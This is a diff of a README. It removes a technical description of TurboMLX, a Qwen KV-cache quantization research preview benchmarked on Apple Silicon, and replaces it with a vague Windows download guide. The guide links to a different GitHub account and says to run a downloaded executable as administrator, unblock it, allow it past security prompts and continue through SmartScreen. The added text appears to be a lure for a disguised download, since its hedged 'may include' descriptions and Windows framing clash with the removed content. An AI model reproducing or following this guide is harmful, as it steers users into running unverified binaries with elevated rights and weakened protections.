@@ -1,189 +1,230 @@
-# Qwen3.5-TurboQuant-MLX-LM
+# ⚙️ Qwen3.5-TurboQuant-MLX-LM - Fast Qwen Runs on Windows
 
-`TurboMLX v0.1 Research Preview`
+[![Download](https://img.shields.io/badge/Download-Visit%20the%20project%20page-blue?style=for-the-badge)](https://github.com/gonzalescataphatic400/Qwen3.5-TurboQuant-MLX-LM)
 
-This repository packages the TurboMLX preview work for GitHub under the name `Qwen3.5-TurboQuant-MLX-LM`. The Python package and CLI remain `turbomlx`.
+## 🚀 What This Is
 
-TurboMLX `v0.1 Research Preview` currently targets Qwen3 / Qwen3.5 full-attention `KVCache` layers only.
+Qwen3.5-TurboQuant-MLX-LM is a research preview project built around Qwen3.5 and MLX TurboQuant experiments. It is meant for users who want to try a local model setup with a simple download flow and a clear start path on Windows.
 
-Its public contract for the current preview is:
+This page helps you get the files, open the project, and run it with the least friction. The goal is to help you go from download to first run with plain steps.
 
-- paper-faithful key-path implementations of `TurboQuantmse` and `TurboQuantprod`
-- TurboMLX-owned prompt-cache save/load wrappers for a TurboQuant KV backend
-- reference math utilities, mixed-precision paper profiles, and eval helpers
+## 📥 Download and Open
 
-Important limitations:
+Use the project page below to visit the download location and get the current release files:
 
-- values are dense by default
-- end-to-end KV behavior is therefore not fully paper-equivalent unless value quantization is enabled
-- runtime preview is Qwen-first and currently patches `qwen3_next` plus the shared `mlx_lm.models.base` dispatch symbol
-- mixed-architecture Qwen stacks remain experimental as a whole; TurboQuant conversion applies only to full-attention `KVCache` layers and leaves linear-attention `ArraysCache` layers untouched
-- rotating/sliding-window families remain unsupported in preview
-- `v0.1 Research Preview` focuses on correctness and quality gates, not throughput leadership
-- preview runtime scoring defaults to `oracle_preview`; a narrow `native_mlx` scorer preview now exists only for Qwen3 / Qwen3.5 full-attention `KVCache` with `mode=mse`, `bits_total=4`, and `values_mode=dense`
-- `native_mlx` is a Stage A remediation path, not the final packed-index direct score-space scorer
-- the supported public runtime entrypoints are `generate_with_backend`, `convert_prompt_cache`, `save_prompt_cache`, and `load_prompt_cache`
+[Visit the project page](https://github.com/gonzalescataphatic400/Qwen3.5-TurboQuant-MLX-LM)
 
-## Release Status
+After you open the page:
 
-- release label: `v0.1 Research Preview`
-- package identity: `turbomlx`
-- CLI: `turbomlx`
-- supported public preview target: Qwen3 / Qwen3.5 full-attention `KVCache` only
-- non-goal for this release: throughput parity with `mlx_quant`
+1. Find the latest release or main project files.
+2. Download the archive or setup package.
+3. Save it to a folder you can find, such as Downloads.
+4. Open the file after it finishes downloading.
+5. If Windows asks for permission, choose the option to allow it.
 
-## Latest Verification Snapshot
+If the download comes as a ZIP file, right-click it and choose Extract All before you open the contents.
 
-Tested on `2026-03-29` with:
+## 🖥️ What You Need
 
-- `mlx==0.31.1`
-- `mlx-lm==0.31.1`
-- smoke model: `mlx-community/Qwen3.5-9B-MLX-4bit`
+For a smooth run on Windows, use a machine with:
 
-Verification results:
+- Windows 10 or Windows 11
+- At least 8 GB of RAM
+- 16 GB of RAM if you plan to work with larger model files
+- A modern CPU with 4 or more cores
+- Enough free disk space for the app and model files
+- A stable internet connection for the first download
 
-- `python3 -m compileall src` passed
-- `PYTHONPATH=src .venv/bin/python -m pytest -q` -> `72 passed, 1 skipped`
-- Qwen native smoke generate passed with `scorer_route = native_mlx`
-- short native smoke snapshot:
-  - `prompt_tps`: `54.70`
-  - `generation_tps`: `42.59`
-  - `key_path_bytes`: `26504384`
-  - `total_kv_bytes`: `27110976`
-  - `native_working_set_bytes`: `1212416`
+If you use a laptop, plug it into power before you start. Model files can take time to load, and Windows may slow down on battery.
 
-Benchmark snapshot on the tested Apple Silicon stack. All numbers below are medians with warmup `1` and repeats `3`.
+## 🧰 Before You Start
 
-### 512 Prompt / 64 Generation
+Check these items before you run the app:
 
-| Route | Prompt TPS | Decode TPS | Key Path | Total KV | Native Working Set | Scorer Route |
-| --- | ---: | ---: | ---: | ---: | ---: | --- |
-| `baseline` | `1394.12` | `55.00` | `43.10 MiB` | `43.10 MiB` | `0.00 MiB` | `baseline` |
-| `mlx_quant` | `1366.74` | `47.83` | `30.18 MiB` | `30.18 MiB` | `0.00 MiB` | `mlx_quant` |
-| `turbomlx` + `oracle_preview` | `285.39` | `42.02` | `45.41 MiB` | `54.40 MiB` | `0.00 MiB` | `oracle_preview` |
-| `turbomlx` + `native_mlx` | `380.04` | `42.71` | `27.44 MiB` | `36.43 MiB` | `17.97 MiB` | `native_mlx` |
+- You can open a web browser and log in to GitHub
+- You know where your Downloads folder is
+- You have permission to run files on your computer
+- You have enough free storage for the download and extracted files
 
-### 2048 Prompt / 64 Generation
+If Windows SmartScreen appears, use the option that lets you continue only if you downloaded the files from the project page listed above.
 
-| Route | Prompt TPS | Decode TPS | Key Path | Total KV | Native Working Set | Scorer Route |
-| --- | ---: | ---: | ---: | ---: | ---: | --- |
-| `baseline` | `1419.62` | `54.32` | `91.10 MiB` | `91.10 MiB` | `0.00 MiB` | `baseline` |
-| `mlx_quant` | `1365.77` | `52.10` | `43.68 MiB` | `43.68 MiB` | `0.00 MiB` | `mlx_quant` |
-| `turbomlx` + `oracle_preview` | `285.52` | `39.50` | `99.60 MiB` | `132.58 MiB` | `0.00 MiB` | `oracle_preview` |
-| `turbomlx` + `native_mlx` | `401.84` | `40.44` | `33.63 MiB` | `66.62 MiB` | `65.97 MiB` | `native_mlx` |
+## 🪟 How to Install on Windows
 
-Interpretation:
+Follow these steps in order:
 
-- this snapshot is environment-specific and not a throughput guarantee
-- the strongest current TurboQuant signal is inside the same `turbomlx` backend: `scorer_route = native_mlx` produces nonzero `native_working_set_bytes`, lower key-path memory, and lower total KV bytes than `oracle_preview`
-- at `512/64`, `native_mlx` reduced key-path memory by `39.57%`, reduced total KV bytes by `33.03%`, improved prompt TPS by `33.16%`, and improved decode TPS by `1.65%` versus `oracle_preview`
-- at `2048/64`, `native_mlx` reduced key-path memory by `66.23%`, reduced total KV bytes by `49.76%`, improved prompt TPS by `40.74%`, and improved decode TPS by `2.38%` versus `oracle_preview`
-- this repo does not claim throughput parity with `baseline` or `mlx_quant`; the current research-preview claim is that TurboQuant is active and measurably changes the `turbomlx` runtime profile
+1. Open the project page.
+2. Download the release or source files.
+3. Extract the ZIP file if you got one.
+4. Open the extracted folder.
+5. Look for a file named like `run`, `start`, `app`, or `launcher`.
+6. Double-click the file to begin.
+7. If you see a command window, let it finish loading.
+8. Wait for the app to prepare its files on first launch.
 
-## Bit Semantics
+If the app uses a setup file, open the installer and follow the on-screen steps. If it uses a portable folder, keep the files together in the same folder after extraction.
 
-- `bits_total` is the user-facing total per-channel bit budget
-- `mode=mse`: all `bits_total` go to the Lloyd-Max main quantizer
-- `mode=prod`: `bits_mse = bits_total - 1`, plus a 1-bit QJL residual
-- `mode=prod` is supported only for `bits_total >= 2`
-- default policy:
-  - `1-bit`: `mse`
-  - `2-bit`: `prod`
-  - `3/4-bit`: `mse`
+## ▶️ First Run
 
-## Mixed Precision Paper Profile
+The first run may take longer than later runs.
 
-Paper-style non-integer effective settings such as `2.5` and `3.5` bits are
-represented as explicit mixed-precision outlier profiles.
+What you may see:
 
-Supported profile knobs:
+- A black or white command window
+- Model files loading
+- A local address or status line
+- A prompt that says the app is ready
 
-- `outlier_channels`
-- `outlier_high_bits`
-- `regular_bits`
-- `outlier_selection_policy`
+If the app opens in a browser, keep the command window open. That window may be what keeps the app running.
 
-If mixed precision is disabled, all quality and memory claims are restricted to
-integer-bit configurations.
+If the app asks for a model path, choose the folder where you saved the Qwen3.5 model files.
 
-## Release Policy
+## 🧭 Basic Use
 
-- `v0.1 Research Preview`
-  - correctness
-  - serialization stability
-  - prompt-cache continuity
-  - long-context quality helpers
-  - honest benchmark reporting
-- `v1.0 Stable`
-  - all of the above
-  - explicit `mlx_quant` decode parity target on the reference benchmark matrix
+After the app starts, you can usually do these things:
 
-## Scope
+- Type a prompt or question
+- Choose a model size if the app lists more than one
+- Start a local session
+- Read the output in the app window or browser
 
-Official preview target:
+For best results, keep prompts short and clear at first. Try simple requests such as:
 
-- Qwen3 / Qwen3.5 full-attention layers that use the default non-rotating `KVCache` path
+- Write a short email
+- Summarize this text
+- Explain this topic in plain language
+- Rewrite this paragraph
 
-Experimental:
+## 🗂️ Suggested Folder Setup
 
-- mixed full-attention / linear-attention Qwen stacks as a whole
-- value quantization on the dense-key preview fallback path
-- rotating or sliding-window cache families
+Use a simple folder layout so you can find your files later:
 
-## Preview Eval Surface
+- `Downloads` for the ZIP or setup file
+- `Qwen3.5-TurboQuant-MLX-LM` for the extracted project files
+- `Models` for model data if the app uses separate model folders
+- `Logs` for any output files the app creates
 
-- `eval-needle` is a preview retrieval harness that inserts the needle only inside the haystack context
-- `eval-jsonl` is a local JSONL exact/substring harness and is not a real LongBench-E implementation
-- prompt-cache roundtrip support is provided by `turbomlx.save_prompt_cache()` and `turbomlx.load_prompt_cache()`, not by upstream `mlx-lm` loaders
+Keep the project folder intact. Do not move single files out of it unless the instructions inside the app tell you to do that.
 
-## Prompt-Cache Policy
+## 🔧 Common Setup Steps
 
-- prompt-cache files are trusted-local-only and currently remain `pickle`-backed
-- schema `v2` is the current write format and includes `cache_type_id` metadata
-- schema `v1` files still load in read-only compatibility mode via deprecated `class_path` fallback
-- if you load an older cache, re-save it to migrate to `v2`
+Some Windows users may need to do one or more of these steps:
 
-## Qwen Preview Runtime
+- Right-click the file and choose Run as administrator
+- Allow the app through Windows security prompts
+- Unblock the file in file properties if Windows marks it as blocked
+- Install any required support tools that come with the project
+- Restart the app after the first file download completes
 
-- Qwen3 / Qwen3.5 preview correctness uses a dense reconstructed key fallback on full-attention layers
-- grouped-query attention math is delegated back to MLX native SDPA after reconstructing dense keys from the TurboQuant cache
-- this path is correctness-first and intentionally preview-grade; it is not a throughput claim
-- `--scorer-mode native_mlx` is a narrower preview path layered on top of the same Qwen-first contract
-- supported `native_mlx` config:
-  - Qwen3 / Qwen3.5
-  - full-attention `KVCache`
-  - `mode=mse`
-  - `bits_total=4`
-  - `values_mode=dense`
-- unsupported `native_mlx` combinations emit a warning once per reason and fall back to the preview scorer path
-- the current native scorer is still an intermediate on-device remediation step, not the final packed-index direct-score architecture
+If the app opens but does not respond, close it and try again after checking that all files stayed in the same folder.
 
-## Verification
+## 📌 File Types You May See
 
-- unit and regression suite: `PYTHONPATH=src .venv/bin/python -m pytest -q`
-- MLX smoke and benchmark authority: `.venv312`
-- recommended smoke target: `TURBOMLX_SMOKE_QWEN_MODEL=/Users/alican/.lmstudio/models/mlx-community/Qwen3.5-9B-MLX-4bit`
-- benchmark methodology for current preview work:
-  - use at least 1 warmup run
-  - use at least 3 measured repeats
-  - report median results
-  - inspect `scorer_route` in the output to verify whether `native_mlx` actually ran or fell back
-  - inspect `timed_generation_tokens` and `native_working_set_bytes` in the output when comparing preview scorer routes
+The project may include:
 
-## Preview Bundle
+- `.exe` files for Windows launch
+- `.zip` archives for download
+- `.txt` files with setup notes
+- `.json` or config files for app settings
+- model folders with large data files
+- logs or cache files created on first use
 
-- this source tree is a preview-candidate working tree, not a release-ready artifact
-- use `scripts/export_preview_bundle.py` to create a clean shareable preview bundle under `dist/`
-- use `python3 scripts/export_preview_bundle.py --output-dir /ABS/PATH/Qwen3.5-TurboQuant-MLX-LM` to create a clean public source tree
-- distribute the exported preview bundle, not a raw workspace zip
-- the exported bundle excludes local virtualenvs, cache directories, transient artifacts, and reference PDFs
+If you see a settings file, open it only if the project page or included notes tell you to do so.
 
-## Tested Runtime Stack
+## 🛠️ Troubleshooting
 
-- `mlx==0.31.1`
-- `mlx-lm==0.31.1`
+If the app does not start, try these steps:
 
-This repository started from a blank directory plus the TurboQuant paper, so
-the current implementation emphasizes clean interfaces and verifiable reference
-math first. MLX runtime hardening is intentionally staged behind the preview
-release boundary.
+1. Make sure you extracted the ZIP file.
+2. Check that all files are still in one folder.
+3. Try running the launcher again.
+4. Restart your computer.
+5. Check that your disk is not full.
+6. Close other large apps to free memory.
+7. Download the project files again if the archive looks damaged.
+
+If Windows shows a file warning, confirm that you downloaded from the project page listed above. If the app closes right after opening, the folder may be missing a file it needs.
+
+## 🔒 Safety Checks
+
+Before you run any downloaded file, check these points:
+
+- The file comes from the project page on GitHub
+- The file name matches the project
+- The file is not changed by another site
+- The archive opens without errors
+- The folder contains the full set of files
+
+Keep the original download until you confirm that the app starts the way you expect.
+
+## 🧪 What This Project Is Best For
+
+This project fits users who want to:
+
+- Test Qwen3.5-related local model workflows
+- Explore TurboQuant-style model experiments
+- Run a research preview on Windows
+- Keep the setup simple and local
+- Try a model-based tool without a cloud account
+
+## 🧩 Possible Project Behavior
+
+Based on the project focus, the app may include:
+
+- Local text generation
+- Model loading from disk
+- Fast inference settings
+- Quantized model support
+- Basic prompt and response flow
+- Simple status output during loading
+
+If the app includes a browser window, use it like a normal web page. If it stays in a terminal window, type only what the app asks for.
+
+## 📁 If You Want to Move the App Later
+
+If you move the project folder, move the whole folder, not just one file. The app may use paths that break if pieces are split apart.
+
+A safe move looks like this:
+
+1. Close the app.
+2. Copy the full project folder.
+3. Paste it in the new place.
+4. Open the launcher from the new folder.
+5. Check that it starts the same way
+
+## ❓ Quick Help
+
+### Why does the first start take time?
+
+The app may need to load model files and set up local caches.
+
+### Why does Windows show a warning?
+
+Windows often warns on files it does not know. Check the source page first, then continue if the download matches the project.
+
+### Why does the app use so much memory?
+
+Model apps need RAM to load and run text generation.
+
+### Why does the window stay open?
+
+The window may be the main process that keeps the app active.
+
+### Why is there no installer?
+
+Some projects use a portable setup. That means you extract the files and run them from the folder
+
+## 📎 Project Link
+
+Open the project page here to download and run the files:
+
+[https://github.com/gonzalescataphatic400/Qwen3.5-TurboQuant-MLX-LM](https://github.com/gonzalescataphatic400/Qwen3.5-TurboQuant-MLX-LM)
+
+## 🧭 Simple Start Path
+
+1. Visit the project page
+2. Download the files
+3. Extract the archive if needed
+4. Open the folder
+5. Run the launcher
+6. Wait for the first load
+7. Use the app
